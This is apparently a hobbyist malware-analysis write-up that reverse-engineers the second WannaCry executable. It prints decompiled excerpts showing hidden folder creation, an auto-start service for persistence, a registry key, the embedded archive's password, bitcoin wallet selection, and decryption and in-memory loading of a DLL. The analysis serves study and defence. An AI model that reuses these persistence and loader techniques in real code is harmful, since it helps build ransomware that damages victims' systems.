## Analysis

### The second executable
Before opening up the second binary in my reversing tool, I checked its size. It is 3.35mb, so I assumed it was still hiding something inside of itself, similarly to the first binary.

sha256: `ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa` 

### Main
The second binary has a much more active main function with multiple different things going on. I will cut this up to pieces, to make sorting it easier.
```c
GetModuleFileNameA(0, FileNameSelf, 520u);
GenerateRandomName(random_name);
if ( *_p___argc() != 2                       
  || (argv = _p___argv(), strcmp((*argv)[1], aI))
  || !CreateInstallFolder(0)
  || (CopyFileA(FileNameSelf, FileName, 0), GetFileAttributesA(FileName) == -1)
  || !HideBinary() )
{
...   
}
```
The process starts again by saving its executable path to the `FileNameSelf` variable.
After saving this variable, it will generate a random name with the `GenerateRandomName` function.
### GenerateRandomName
At the start, the function initialize a random seed using the computer name:
```c
GetComputerNameW(computer_name, &nSize);
i = 0;
random_seed = 1;
if ( wcslen(computer_name) )
{
  do
  {
    random_seed *= *computer_name;
    ++i;
    ++computer_name;
  }
  while ( i < wcslen(computer_name) );
}
srand(random_seed);
```
This will iterate through the computer's name and use the number wide char representation of the individual characters of the name to generate a seed for generating random numbers (and characters) later on.

After generating the seed for the random number generator, the function will generate a random set of characters, between 8 - 15 characters long.
```c
running_number = 0;
init_random = rand() % 8 + 8;
if ( init_random > 0 )
{
  do
  {
    *(running_number + display_name) = rand() % 26 + 'a';
    ++running_number;
  }
  while ( running_number < init_random );
}
```
After generating the character portion, the same function will add three random numbers to the end and return the generated random name.
```c
init_random_plus_3 = init_random + 3;
while ( running_number < init_random_plus_3 )
{
  *(running_number + display_name) = rand() % 10 + '0';
  ++running_number;
}
result = display_name;
*(running_number + display_name) = 0;
return result;
```

The point of this, is to create a random name. While it is random, is always replicatable on each machine. This name will be used for hiding files later on.

### More of main
Jumping back to the main function again:
```c
GetModuleFileNameA(0, FileNameSelf, 520u);
GenerateRandomName(random_name);
if ( *_p___argc() != 2                            // <-- This
  || (argv = _p___argv(), strcmp((*argv)[1], aI)) // <-- and this!
  || !CreateInstallFolder(0)
  || (CopyFileA(FileNameSelf, FileName, 0), GetFileAttributesA(FileName) == -1)
  || !HideBinary() )
{
...
}
```
We can see that underneath the random name generator, there is a big if statement running multiple different functions.

Going from the top down, it will check if it was run with anything except two arguments. 

If it was run with two arguments, it will attempt the following: `(argv = _p___argv(), strcmp((*argv)[1], aI))` this is checking if the first argument is `/i`.

If the process is not run with `/i`, the executable will first call the `CreateInstallFolder` function.
### CreateInstallFolder
The function is rather straightforward:
```c
MultiByteToWideChar(0, 0, random_name, -1, random_name_wchar, 99);
GetWindowsDirectoryW(Buffer, 0x104u);         // C:\Windows
swprintf(FileName, aSProgramdata, Buffer);    // C:\ProgramData
if ( GetFileAttributesW(FileName) != -1 && CreateHiddenFolder(FileName, random_name_wchar, arg_zero) )
  return 1;
swprintf(FileName, aSIntel, Buffer);          // C:\Intel
if ( CreateHiddenFolder(FileName, random_name_wchar, arg_zero)
  || CreateHiddenFolder(Buffer, random_name_wchar, arg_zero) )
{
  return 1;
}
GetTempPathW(0x104u, FileName);
if ( wcsrchr(FileName, '\\') )
  *wcsrchr(FileName, '\\') = 0;
return CreateHiddenFolder(FileName, random_name_wchar, arg_zero) != 0;
```
The function will iterate through `C:\Windows`, `C:\ProgramData` and `C:\Intel` to try to generate a hidden folder with the previously generated random name.
If it is unable to use any of these folders, the process will default to generating a temporary folder with the same, randomly generated name. 

As the call's return is flipped in the if statement, if this succeeds, the program will move onto the next if statement's call: 
```c
(CopyFileA(FileNameSelf, FileName, 0), GetFileAttributesA(FileName) == -1)`
```
This is a short call that will attempt to copy itself to the file `tasksche.exe`, incidentally the same file name as used in the first binary. The final location will be in the previously created hidden folder, as the process's context was changed to there during the creation of the hidden folder.

### HideBinary
The next and final function ran in the if statement evaluation is the `HideBinary` function. 

```c
GetFullPathNameA(FileName, 520u, Buffer, 0);  // Copies self to hidden directory, launches self from there
return CreateSelfService(Buffer) && SingleInstanceCheck(60)
    || CreateSelfProcess(Buffer, 0, 0) && SingleInstanceCheck(60);
```
This is a short function, and nothing that interesting is done here. If we look at the `CreateSelfService` function, the main point of interest is the following:
```c
sprintf(service_command, "cmd.exe /c \"%s\"", a1);
new_service = CreateServiceA(
                hSCManager,
                random_name,                // Service name
                random_name,                // Display name
                0xF01FFu,                   // SERVICE_ALL_ACCESS
                0x10u,                      // SERVICE_WIN32_OWN_PROCESS
                2u,                         // SERVICE_AUTO_START
                1u,
                service_command,
                0,
                0,
                0,
                0,
                0);
...
StartServiceA(new_service, 0, 0);
```
The executable will create a service that will launch itself with the help of the Windows command prompt. After this, it will check the `SingleInstanceCheck` function, which will attempt to open a mutex to confirm it is the only instance of the process running. The `CreateSelfProcess` attempt to run itself again, this time as a process.

Now, after the  `HideBinary()` function, we get to the meat of the main function.

### Inside the if statement
The first thing the binary does it set its current directory to that of the executable file, I assume the point here is that the current context gets changed during the if statement test functions.
```c
if ( strrchr(FileNameSelf, '\\') )            // Checks if the fileNameSelf ends in a backslash
  *strrchr(FileNameSelf, '\\') = 0;
SetCurrentDirectoryA(FileNameSelf);
```
After changing the context, the executable will run the `CreateRegisteryKey` function, passing a 1 to it. Let's take a closer look at it.
### CreateRegisteryKey

The main meat of the function is here:
```c
wcscat(dest, L"WanaCrypt0r");
while ( 1 )
{
  if ( i )
    RegCreateKeyW(HKEY_CURRENT_USER, dest, &registery_handle);
  else
    RegCreateKeyW(HKEY_LOCAL_MACHINE, dest, &registery_handle);
  if ( registery_handle )
  {
    if ( passed_value )
    {
      GetCurrentDirectoryA(519u, current_directory);
      current_directory_length = strlen(current_directory);
      registery_edit_status = RegSetValueExA(
                                registery_handle,
                                ValueName,
                                0,
                                1u,
                                current_directory,
                                current_directory_length + 1) == 0;
    }
    else
    {
      static_directory_length = 519;
      v3 = RegQueryValueExA(
             registery_handle,
             ValueName,
             0,
             0,
             current_directory,
             &static_directory_length);
      registery_edit_status = v3 == 0;
      if ( !v3 )
        SetCurrentDirectoryA(current_directory);
    }
    RegCloseKey(registery_handle);
    if ( registery_edit_status )
      break;
  }
    ...
}
```
The function will begin by attempting to create a `WanaCrypt0r` key in the `HKEY_CURRENT_USER` context. After this, it will save the path of the binary's home directory in this key. I believe the point is, to save where the binary's "home" is. If it fails in setting the key in the `HKEY_CURRENT_USER` context, it will generate the same key in the `HKEY_LOCAL_MACHINE` context.

This function can be called later on and by passing a zero to it, when it will then change the current directory to be in the binary's "home" folder.

After setting the registery key, the process will run the `DecryptAndWriteToDisk` function and pass it a zero and the string `WNcry@2ol7`.
### DecryptAndWriteToDisk
Similarly to how the initial dropper function worked, this function will look for a specified resource inside of itself and write it on the disk:
```c
resource_info_handle = FindResourceA(hModule, '\b\n', Type);
resource_info_handle_cp = resource_info_handle;
resource_handle = LoadResource(hModule, resource_info_handle);
resource_start = LockResource(resource_handle);
resource_size = SizeofResource(hModule, resource_info_handle_cp);
unzip_content = UnzipInternalArchive(resource_start, resource_size, zip_password);
DecryptData(unzip_content, -1, &Src);
v9 = Src;
for ( i = 0; i < v9; ++i )
{
  DecryptData(unzip_content, i, &Src);
  if ( strcmp(Str1, c_wnry) || GetFileAttributesA(Str1) == -1 )
    write_zip_on_disk(unzip_content, i, Str1);
}
sub_407656(unzip_content);
return 1;
```
There is a lot of guesswork going on in this portion of the analysis. I believe the UnzipInternalArchive and DecryptData functions are both from an external library. This is also supported by strings such as "unzip 0.15 Copyright 1998 Gilles Vollant" being present in the binary. I originally began analyzing this function (tree), but it seems futile due to the sheer volume of calls in each branch.

Dropping this binary to PE-bear, I look at the resources section again and find the following information about the resource the binary looks for.
It starts at offset `0x100F0` and is `0x349635` bytes long. Given this information, I reuse my previously written python resource extractor and write the password encrypted zip on the disk.

I assumed that the `WNcry@2ol7` string might be the password, and voilà! It was, I have now unlocked the third file!
Looking at the size of the written zip, it is 3.28 MBs, the majority of the executable file was yet again, another file.

The contents of the zip file:
- msg (Folder containing different files which are various language versions of GUI program's text)
- b.wnry
- c.wnry
- r.wnry
- s.wnry
- t.wnry
- u.wnry
- taskdl.exe
- taskse.exe

### ReadCwnry
After extracting the zip files contents on the drive, the first function that is called is `ReadCwnry`.
```c
char *bitcoin_address_list[3];
bitcoin_address_list[0] = a13am4vw2dhxygx;
bitcoin_address_list[1] = a12t9ydpgwuez9n;
bitcoin_address_list[2] = a115p7ummngoj1p;
result = read_or_write_file(Buffer, 1);
if ( result )
{
  random_int = rand();
  strcpy(bitcoin_address, bitcoin_address_list[random_int % 3]);
  return read_or_write_file(Buffer, 0);
}
return result;
```
The variables being inserted into `bitcoin_address_list` are, as the name suggests, hardcoded bitcoin wallets. The `read_or_write_file` function will read the contents of the `c.wnry` file in the from the zip archive into memory, insert a random bitcoin address into it and write it back to the file. I believe this is used for seeding the GUI program to give a randomized bitcoin address. As the address is generated with `rand()`, which was seeded before during the `GenerateRandomName` function, the chosen wallet should always be the same for a single machine.

After seeding the `c.wnry`, the process will run these two commands: `attrib +h .` and `icacls . /grant`. This will hide the extracted directory, and give every user read/write access to it. I am assuming the read/write access is used to avoid potential access errors with running the GUI program later on, if another user logs onto the machine. 

### Cryptography functions
Now, the process will dynamically load the following `kernel32.dll` and `advapi32.dll` functions using `GetProcAddress` for use later on:
 - CryptAcquireContextA 
 - CryptImportKey 
 - CryptDestroyKey 
 - CryptEncrypt 
 - CryptDecrypt 
 - CryptGenKey 
 - CreateFileW
 - WriteFile
 - ReadFile
 - MoveFileW
 - MoveFileExW
 - DeleteFileW
 - CloseHandle

Now that the process has loaded the required functions, it will initialize some sort of cryptography structure. I attempted to identify the specific structure type for a long time, but was unable to do so. I believe its from a foreign library and not a Windows native cryptography structure. My best guess would be some version/fork of `ZLIB`.

After initializing the cryptography structure, we get to some interesting aprts of this executable.
```c
dll_start_position = FetchAndDecryptDLL(unknown_encryption_struct, t_wnry, &dll_size);
if ( dll_start_position )
{
  handle_to_library = LoadLibraryInMemory(dll_start_position, dll_size);
  if ( handle_to_library )
  {
    dll_entry_function = GetProcAddrCustom(handle_to_library, target_function); // TaskStart
    if ( dll_entry_function )
      dll_entry_function(0, 0);
  }
}
```
Looking at the code, we are very interested in the `FetchAndDecryptDLL` function. The passed `t_wnry` should give us a hint on which file contains a dll.

### FetchAndDecryptDLL
The important contents of this monstrocity of function are the following:
```c
handle_to_file = CreateFileA(filename, 0x80000000, 1u, 0, 3u, 0, 0);
GetFileSizeEx(handle_to_file, &file_size);
ReadFileDynamic(handle_to_file, &Buf1, 8u, &NumberOfBytesRead, 0);
if ( memcmp(&Buf1, aWanacry, 8u) ) {
  return 0;
}
ReadFileDynamic(handle_to_file, &size_of_chunk, 4u, &NumberOfBytesRead, 0);
if ( size_of_chunk == 256 ) {
  return 0;
}
ReadFileDynamic(handle_to_file, this[306], 256u, &NumberOfBytesRead, 0);
ReadFileDynamic(handle_to_file, &Buffer, 4u, &NumberOfBytesRead, 0);
ReadFileDynamic(handle_to_file, &u_16_max, 8u, &NumberOfBytesRead, 0);
DecryptWrapper((this + 1), this[306], size_of_chunk, decrypted_data, &size_of_decrypted)
AESfunction((this + 21), decrypted_data, key_or_data, size_of_decrypted, 16);
buffer_for_dll = GlobalAlloc(0, u_16_max)
if ( ReadFileDynamic(handle_to_file, this[306], file_size.LowPart, &NumberOfBytesRead, 0)// Reads DLL to memory
  && NumberOfBytesRead
  && NumberOfBytesRead >= u_16_max )
{                     // At this point, this[306] contains the encrypted DLL
  output_buffer = buffer_for_dll;// Decrypts DLL and stores it in buffer_for_dll
  DecryptDLLContent((this + 21), this[306], buffer_for_dll, NumberOfBytesRead, 1);
  *size_of_dll = u_16_max;
}
```
NB! This has been **heavily** edited to be more readable. The original function is full of nested if statements for each read.

In this function, it is important to note that the `ReadFileDynamic` is referencing the dynamically fetched `ReadFile` function.

This function will first begin by reading the first 8 bytes of the binary and attempts to match them to the string `WANACRY!`. I assume this is done to check that we are dealing with the correct file.

After this, the function will read the next four bytes, and check that it is 256. This is, maybe not so coincidentally, the size of the next read. The data from this read is stored in some field in the previously initialized cryptography structure. Due to the length, I assume this is some cryptography constant but I am unsure. As the data is bytes, it does not make sense for it to be a raw decryption key. I am assuming it is an encrypted variant of the decryption key. 

After reading the decryption key, the process seems to read a bit more, of which's data is not used for anything. This is maybe used as an easy way to seek forwards? I am unsure. After this, the length of the actual data section is read, then, with the data section, the rest of the file is read and decrypted into memory. The decrypted file content is returned back to the main function for further processing.

### The ending of the main function
Looking at the main again, we see that the rest of the function goes as follows:
```c
handle_to_library = LoadLibraryInMemory(dll_start_position, dll_size);
if ( handle_to_library )
{
  dll_entry_function = GetProcAddrCustom(handle_to_library, target_function);
  if ( dll_entry_function )
    dll_entry_function(0, 0);
}
```
The LoadLibraryInMemory seems to be a function that loads the now decrypted data blob, a DLL into memory. There is a great deal of guesswork going on here. The `LoadLibraryInMemory` function went very deep, and I saw the outcome so I figured it would be better to save time and move onto the actual DLL file, instead of investigating the function.

The ending of the main function will move the processing over to the now mapped DLL's `TaskStart` function.

## Afterthoughts
Being able to identify the cryptography structure in use would have saved a ton of time during the analysis. A lot of time was wasted trying to understand how it worked and even more trying to find the actual cryptography type, to no avail.

The entire encrypted DLL file was very shaky compared to everything else during the write up. The file handling seems confusing, after it is read to memory. Not being able to identify the cryptography structure certainly made this a lot more difficult than it had to be.

I retrieved the unencrypted DLL by via dynamic analysis. This was by far the fastest way to go about this and while it saved time, I could have maybe learnt more by sticking to static analysis.

Some funny accidents happened during dynamic analysis, [forgetting to `NOP` out certain instructions](https://raw.githubusercontent.com/Chalkybot/Reversing-Wannacry/refs/heads/main/images/oops.png) resulted in some late night laughs. Copying over the unencrypted dll's hex text to my host machine resulted in defender [throwing a hissy fit](https://raw.githubusercontent.com/Chalkybot/Reversing-Wannacry/refs/heads/main/images/wrong_pc.png), slowing everything down for 15 minutes.